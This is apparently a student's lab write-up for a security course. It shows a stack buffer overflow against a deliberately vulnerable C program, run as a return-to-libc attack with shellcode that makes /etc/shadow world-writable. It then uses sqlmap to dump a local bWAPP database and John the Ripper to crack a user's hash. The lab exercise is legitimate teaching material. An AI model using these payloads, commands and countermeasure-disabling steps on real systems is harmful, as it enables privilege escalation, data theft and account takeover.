# Task 1: Software buffer overflow attack
 
Given a vulnerable C program 
```
#include <stdio.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char buffer[16];
	strcpy(buffer,argv[1]);
	return 0;
}
```
and a shellcode in C. This shellcode executes chmod 777 /etc/shadow without having to sudo to escalate privilege
```
#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x89\xc3\x31\xd8\x50\xbe\x3e\x1f"
"\x3a\x56\x81\xc6\x23\x45\x35\x21"
"\x89\x74\x24\xfc\xc7\x44\x24\xf8"
"\x2f\x2f\x73\x68\xc7\x44\x24\xf4"
"\x2f\x65\x74\x63\x83\xec\x0c\x89"
"\xe3\x66\x68\xff\x01\x66\x59\xb0"
"\x0f\xcd\x80";

int
void main() {
    int (*ret)() = (int(*)())code;
}
```
**Question 1**:
- Compile both C programs and shellcode to executable code. 
- Conduct the attack so that when C executable code runs, shellcode willc also be triggered. 
  You are free to choose Code Injection or Environment Variable approach to do. 
- Write step-by-step explanation and clearly comment on instructions and screenshots that you have made to successfully accomplished the attack.
**Answer 1**: Must conform to below structure:

Description text (optional)

Step 1: I saved shell code in a file named : shell.c and vulnerable code in a file name code.c . After that, complie both of them 
```
gcc -g shell.c -o shell.out -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack
gcc -g code.c -o code.out -fno-stack-protector -mpreferred-stack-boundary=2 -z execstack
```

Step 2:  Turn off bash countermeasures of Ubuntu and Turn off address space layout radomization
```
sudo ln -sf /bin/zsh /bin/sh
sudo sysctl -w kernel.randomize_va_space=0
```

Step 3:  I will use system() to execute shell code in order to when i overflow the buffer memory , it will execute the shell code that in saved in code.out after compiling. So i need to save code.out to an evironment variable
``` 
  export MYYVAR="/home/seed/seclabs/lab/task1/shell.out"
```

Step 4: gdb -q code.out

Step 5 : start

Step 6: In this step, i will find the address of system , exit and my environment variable. exit() will consider argc as return address of system()

![image](https://github.com/user-attachments/assets/b5e22c0a-651e-451d-80e7-7d70c77d84a2)

Step 7: Now, i will conduct the attack by using this code: 
```
run $(python -c "print('a' * 20 + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x39\xdf\xff\xff')")
```
The first 20 bytes will overflow the buffer memory and the ebp, followed by the addresses i extract from gdb . And the result here: 

![image](https://github.com/user-attachments/assets/7ec7b66b-1632-4960-977d-6be74a316e8b)

output screenshot (optional)
Before conducting attack: The etc/shadow have privilege is 640 

![image](https://github.com/user-attachments/assets/8a7caf86-55e2-463b-b785-84186bc7655b)

After conducting attack: The etc/shadow have privilege is 777

![image](https://github.com/user-attachments/assets/758c2b57-05a7-4418-b805-66638791bdce)




**Conclusion**: comment text about the screenshot or simply answered text for the question

# Task 2: Attack on the database of bWapp 
- Install bWapp (refer to quang-ute/Security-labs/Web-security). 
- Install sqlmap.
- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup. 

**Question 1**: Use sqlmap to get information about all available databases
**Answer 1**:

Step 1: Install SQL map from this link : https://github.com/sqlmapproject/sqlmap.git

Step 2: Install bWAPP by following the tutorial in this link: https://github.com/quang-ute/Security-labs/tree/main/Web-security/Vulnerable%20Web%20App

Step 3: Login and choose the bug:

![image](https://github.com/user-attachments/assets/e708c4d6-b51c-4125-8683-c5fa7692435c)

Step 4: Select movie and copy the url ( note that: delete query action ) : http://localhost:8025/sqli_2.php?movie=1

![image](https://github.com/user-attachments/assets/84ffb76e-4217-4558-9090-b022dcbdebbf)

![image](https://github.com/user-attachments/assets/3b315eed-2f9b-42ab-a9b7-0f0f7011b964)


Step 5: Open Developer Tool and get cookie value in tab Application

![image](https://github.com/user-attachments/assets/190e9138-8366-40a9-b277-d06cf45cb92d)


Step 6: cd to folder sqlmap and run the code : python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" --dbs --cookie="PHPSESSID=q9s62q6gaojhs1g2meag832sa3;security_level=0"


Step 7: Always type y and the terminal show all the databases

![image](https://github.com/user-attachments/assets/70c022fe-a3b0-4e75-8120-c3426bba3bfe)


**Question 2**: Use sqlmap to get tables, users information
**Answer 2**:	

Step 1: Run this code to see all the tables of bWAPP database: sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" -D bWAPP --tables --cookie="PHPSESSID=q9s62q6gaojhs1g2meag832sa3;security_level=0"

![image](https://github.com/user-attachments/assets/0280a6a8-e771-4df8-b6c4-aa1ece23bbae)

Step 2: Run this code see all the column of users table: python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" -D bWAPP -T users --columns --cookie="PHPSESSID=q9s62q6gaojhs1g2meag832sa3;security_level=0"

![image](https://github.com/user-attachments/assets/972a52b4-b243-4366-a157-ad269d6a5530)

Step 3: Run this code to see all records in table user : python sqlmap.py -u "http://localhost:8025/sqli_2.php?movie=1" -D bWAPP -T users --dump --cookie="PHPSESSID=q9s62q6gaojhs1g2meag832sa3;security_level=0"


![image](https://github.com/user-attachments/assets/3d8e083d-96d6-4559-9093-5d929c14d623)



**Question 3**: Make use of John the Ripper to disclose the password of all database users from the above exploit
**Answer 3**:

Step 1: Download john from this link : http://www.openwall.com/john/

Step 2: Take note hash password of one of users in file .txt . I will take note hash password of user A.I.M. in file psw.txt

![image](https://github.com/user-attachments/assets/02588425-132e-47a9-9a2e-e2f7c548ea63)

Step 3: Save file psw.txt in run folder of john folder i just download

Step 4: Open folder run in terminal and run : ./john --incremental psw.txt to decode hash password

![image](https://github.com/user-attachments/assets/94e403e4-b5d4-450b-b4d4-433ee7b269d1)


Step 5: Run ./john --show psw.txt to show the password after decoding 

![image](https://github.com/user-attachments/assets/7191dc20-af7d-421a-99de-e544d25e8338)


Step 6: Login successfull

![image](https://github.com/user-attachments/assets/451f1c76-f041-4061-88cf-d24e21f3ed6a)

![image](https://github.com/user-attachments/assets/2ca4bad0-fca6-4020-9f79-4ce3c601375b)




